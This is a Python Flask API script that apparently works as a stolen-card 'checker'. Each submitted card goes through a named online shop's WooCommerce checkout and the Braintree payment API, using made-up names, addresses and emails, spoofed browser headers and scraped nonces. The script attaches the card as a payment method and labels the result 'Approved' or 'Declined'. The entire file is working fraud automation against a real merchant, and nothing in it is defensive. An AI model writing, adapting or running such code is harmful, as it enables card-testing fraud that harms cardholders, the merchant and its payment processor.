from flask import Flask, request, jsonify
import requests
from requests import Session
import random
import base64
import json
import re
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/api/process-card', methods=['POST'])
def process_card():
    try:
        data = request.json
        card = data.get('card')
        if not card:
            return jsonify({'error': 'Card details required'}), 400
        
        try:
            cc, mm, yy, cvv = card.split('|')
        except ValueError:
            return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
        
        random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
        email = f"hunterjsidt{random5}@gmail.com"
        
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee"]
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        
        us_addresses = [
            {"address": "123 Main St", "city": "New York", "state": "NY", "zip": "10001"},
            {"address": "456 Oak Ave", "city": "Los Angeles", "state": "CA", "zip": "90001"},
            {"address": "789 Pine Rd", "city": "Chicago", "state": "IL", "zip": "60601"},
            {"address": "321 Elm St", "city": "Houston", "state": "TX", "zip": "77001"},
            {"address": "654 Maple Dr", "city": "Phoenix", "state": "AZ", "zip": "85001"},
            {"address": "987 Cedar Ln", "city": "Philadelphia", "state": "PA", "zip": "19101"},
            {"address": "147 Birch Blvd", "city": "San Antonio", "state": "TX", "zip": "78201"},
            {"address": "258 Walnut Way", "city": "San Diego", "state": "CA", "zip": "92101"},
            {"address": "369 Spruce Ct", "city": "Dallas", "state": "TX", "zip": "75201"},
            {"address": "741 Ash St", "city": "San Jose", "state": "CA", "zip": "95101"},
            {"address": "852 Poplar Ave", "city": "Austin", "state": "TX", "zip": "78701"},
            {"address": "963 Beech Rd", "city": "Jacksonville", "state": "FL", "zip": "32201"},
            {"address": "159 Sycamore Dr", "city": "Fort Worth", "state": "TX", "zip": "76101"},
            {"address": "357 Magnolia Ln", "city": "Columbus", "state": "OH", "zip": "43201"},
            {"address": "753 Hickory Blvd", "city": "Charlotte", "state": "NC", "zip": "28201"},
            {"address": "951 Dogwood Way", "city": "San Francisco", "state": "CA", "zip": "94101"},
            {"address": "246 Juniper Ct", "city": "Indianapolis", "state": "IN", "zip": "46201"},
            {"address": "468 Laurel Ave", "city": "Seattle", "state": "WA", "zip": "98101"},
            {"address": "579 Cypress Rd", "city": "Denver", "state": "CO", "zip": "80201"},
            {"address": "684 Olive Dr", "city": "Washington", "state": "DC", "zip": "20001"},
            {"address": "792 Palm Ln", "city": "Boston", "state": "MA", "zip": "02101"},
            {"address": "861 Willow Blvd", "city": "El Paso", "state": "TX", "zip": "79901"},
            {"address": "934 Fir Way", "city": "Detroit", "state": "MI", "zip": "48201"},
            {"address": "106 Redwood Ct", "city": "Nashville", "state": "TN", "zip": "37201"},
            {"address": "208 Cedar Ave", "city": "Memphis", "state": "TN", "zip": "38101"},
            {"address": "314 Oak St", "city": "Portland", "state": "OR", "zip": "97201"},
            {"address": "425 Pine Rd", "city": "Oklahoma City", "state": "OK", "zip": "73101"},
            {"address": "536 Elm Dr", "city": "Las Vegas", "state": "NV", "zip": "89101"},
            {"address": "647 Maple Ln", "city": "Baltimore", "state": "MD", "zip": "21201"},
            {"address": "758 Birch Blvd", "city": "Milwaukee", "state": "WI", "zip": "53201"}
        ]
        
        addr = random.choice(us_addresses)
        r = Session()
        
        url = "https://silvercellwireless.com"
        params = {'add-to-cart': "1203", 'quantity': "1"}
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://silvercellwireless.com/shop/accessories/1203/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        response = r.get(url, params=params, headers=headers)
        
        url = "https://silvercellwireless.com/checkout/"
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://silvercellwireless.com/cart/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        response = r.get(url, headers=headers)
        
        updatenonce_match = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', response.text)
        if not updatenonce_match:
            return jsonify({'error': 'Update order review nonce not found'}), 400
        updatenonce = updatenonce_match.group(1)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', id='woocommerce-process-checkout-nonce')
        if not nonce_input:
            return jsonify({'error': 'Checkout nonce not found'}), 400
        checkout = nonce_input['value'] if nonce_input else None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        all_text = str(soup)
        match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)["\']', all_text)
        if not match:
            return jsonify({'error': 'Client token nonce not found'}), 400
        client_token_nonce = match.group(1) if match else None
        
        url = "https://silvercellwireless.com/wp-admin/admin-ajax.php"
        payload = {
            'action': "wc_braintree_credit_card_get_client_token",
            'nonce': client_token_nonce,
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'sec-ch-ua-platform': "\"Windows\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'origin': "https://silvercellwireless.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://silvercellwireless.com/checkout/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
        }
        response = r.post(url, data=payload, headers=headers)
        
        token1 = None
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
                auth = token_data.get('authorizationFingerprint')
                braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
                
                headers7 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {auth}',
                    'Braintree-Version': '2018-05-10',
                    'Origin': 'https://assets.braintreegateway.com',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://assets.braintreegateway.com/',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'priority': 'u=1, i',
                }
                
                payload = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': braintree_session_id,
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvv,
                            },
                            'options': {'validate': False},
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }
                
                response = r.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers7)
                
                if response.status_code == 200:
                    result = response.json()
                    if 'errors' not in result:
                        token1 = result['data']['tokenizeCreditCard']['token']
                    else:
                        return jsonify({'error': 'Card tokenization failed', 'details': result['errors']}), 400
                else:
                    return jsonify({'error': 'Braintree API error', 'status': response.status_code}), 400
            else:
                return jsonify({'error': 'Failed to get client token'}), 400
        else:
            return jsonify({'error': 'Admin AJAX error', 'status': response.status_code}), 400
        
        if token1:
            url = "https://silvercellwireless.com"
            params = {'wc-ajax': "update_order_review"}
            payload = {
                'security': updatenonce,
                'payment_method': "blastoff_braintree_vault",
                'country': "US",
                'state': "TN",
                'postcode': "",
                'city': "",
                'address': "",
                'address_2': "",
                's_country': "US",
                's_state': "TN",
                's_postcode': "",
                's_city': "",
                's_address': "",
                's_address_2': "",
                'has_full_address': "true",
                'post_data': f"billing_email={email}&billing_password=&billing_email_confirm={email}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://silvercellwireless.com/my-account/add-payment-method/&wc_order_attribution_session_start_time=2026-06-30 15:09:55&wc_order_attribution_session_pages=10&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&service_first_name={first_name}&service_last_name={last_name}&service_country=US&service_address_1={addr['address']}&service_address_2=&service_city={addr['city']}&service_state={addr['state']}&service_postcode={addr['zip']}&payment_method=blastoff_braintree_vault&blastoff_braintree_vault_saved_token_id=new&blastoff_braintree_vault_payment_nonce=&year_of_birth=&woocommerce-process-checkout-nonce={checkout}&_wp_http_referer=/?wc-ajax=update_order_review&shipping_method[0]=flat_rate:1",
                'shipping_method[0]': "flat_rate:1"
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                'sec-ch-ua-platform': "\"Windows\"",
                'x-requested-with': "XMLHttpRequest",
                'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
                'sec-ch-ua-mobile': "?0",
                'origin': "https://silvercellwireless.com",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://silvercellwireless.com/checkout/",
                'accept-language': "en-US,en;q=0.9",
                'priority': "u=1, i",
            }
            response = r.post(url, params=params, data=payload, headers=headers)
            
            url = "https://silvercellwireless.com"
            params = {'wc-ajax': "checkout"}
            payload = {
                'billing_email': email,
                'billing_password': "",
                'billing_email_confirm': email,
                'wc_order_attribution_source_type': "typein",
                'wc_order_attribution_referrer': "(none)",
                'wc_order_attribution_utm_campaign': "(none)",
                'wc_order_attribution_utm_source': "(direct)",
                'wc_order_attribution_utm_medium': "(none)",
                'wc_order_attribution_utm_content': "(none)",
                'wc_order_attribution_utm_id': "(none)",
                'wc_order_attribution_utm_term': "(none)",
                'wc_order_attribution_utm_source_platform': "(none)",
                'wc_order_attribution_utm_creative_format': "(none)",
                'wc_order_attribution_utm_marketing_tactic': "(none)",
                'wc_order_attribution_session_entry': "https://silvercellwireless.com/my-account/add-payment-method/",
                'wc_order_attribution_session_start_time': "2026-06-30+15:09:55",
                'wc_order_attribution_session_pages': "10",
                'wc_order_attribution_session_count': "1",
                'wc_order_attribution_user_agent': "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/148.0.0.0+Safari/537.36",
                'service_first_name': first_name,
                'service_last_name': last_name,
                'service_country': "US",
                'service_address_1': addr['address'],
                'service_address_2': "",
                'service_city': addr['city'],
                'service_state': addr['state'],
                'service_postcode': addr['zip'],
                'payment_method': "blastoff_braintree_vault",
                'blastoff_braintree_vault_saved_token_id': "new",
                'blastoff_braintree_vault_payment_nonce': token1,
                'year_of_birth': "2000",
                'woocommerce-process-checkout-nonce': checkout,
                '_wp_http_referer': "/?wc-ajax=update_order_review",
                'shipping_method[0]': "flat_rate:1"
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                'Accept': "application/json, text/javascript, */*; q=0.01",
                'sec-ch-ua-platform': "\"Windows\"",
                'x-requested-with': "XMLHttpRequest",
                'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
                'sec-ch-ua-mobile': "?0",
                'origin': "https://silvercellwireless.com",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://silvercellwireless.com/checkout/",
                'accept-language': "en-US,en;q=0.9",
                'priority': "u=1, i",
            }
            response = r.post(url, params=params, data=payload, headers=headers)
        
        url = "https://silvercellwireless.com/my-account/set-password/"
        payload = {
            'new_password': "DDcc55@&#",
            'reenter_password': "DDcc55@&#",
            'new_woo_pin': "1234",
            'question1': "5",
            'question1_answer': "None"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'origin': "https://silvercellwireless.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://silvercellwireless.com/my-account/set-password/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        response = r.post(url, data=payload, headers=headers)
        
        url = "https://silvercellwireless.com/my-account/add-payment-method/"
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "none",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        response = r.get(url, headers=headers)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
        if not nonce_input:
            return jsonify({'error': 'Add payment method nonce not found'}), 400
        nonce_value3 = nonce_input['value'] if nonce_input else None
        
        url = "https://silvercellwireless.com/my-account/add-payment-method/"
        payload = {
            'payment_method': "braintree_credit_card",
            'wc-braintree-credit-card-card-type': "visa",
            'wc-braintree-credit-card-3d-secure-enabled': "",
            'wc-braintree-credit-card-3d-secure-verified': "",
            'wc-braintree-credit-card-3d-secure-order-total': "13.82",
            'wc_braintree_credit_card_payment_nonce': token1,
            'wc_braintree_device_data': "{\"correlation_id\":\"1eb04af3-552c-43b0-8828-a47d1349\"}",
            'wc-braintree-credit-card-tokenize-payment-method': "true",
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_country': "US",
            'billing_address_1': addr['address'],
            'billing_address_2': "",
            'billing_city': addr['city'],
            'billing_state': addr['state'],
            'billing_postcode': addr['zip'],
            'billing_email': email,
            'woocommerce-add-payment-method-nonce': nonce_value3,
            '_wp_http_referer': "/my-account/add-payment-method/",
            'woocommerce_add_payment_method': "1"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': "\"Windows\"",
            'upgrade-insecure-requests': "1",
            'origin': "https://silvercellwireless.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://silvercellwireless.com/my-account/add-payment-method/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
        }
        response = r.post(url, data=payload, headers=headers)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        error_element = soup.find('ul', class_='woocommerce-error')
        error_message = None
        if error_element:
            li_items = error_element.find_all('li')
            for li in li_items:
                text = li.text.strip()
                if 'Status code' in text or 'error' in text.lower():
                    error_message = text
                    break
            if not error_message and li_items:
                error_message = li_items[0].text.strip()
        
        if re.search(r'Avs', response.text) or re.search(r'avs', response.text):
            result = "Approved-1000 ✅"
        elif re.search(r'Nice', response.text):
            result = "Approved-1000 ✅"
        elif re.search(r'Added', response.text):
            result = "Approved-1000 ✅"
        elif re.search(r'Successfully', response.text):
            result = "Approved-1000 ✅"
        elif error_message and 'Status code' in error_message:
            result = f"Declined: {error_message}"
        elif error_message:
            result = f"Declined: {error_message}"
        else:
            result = "Unknown error"
        
        return jsonify({'result': result, 'email': email, 'first_name': first_name, 'last_name': last_name, 'address': addr}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

if __name__ == '__main__':
    app.run(debug=True)
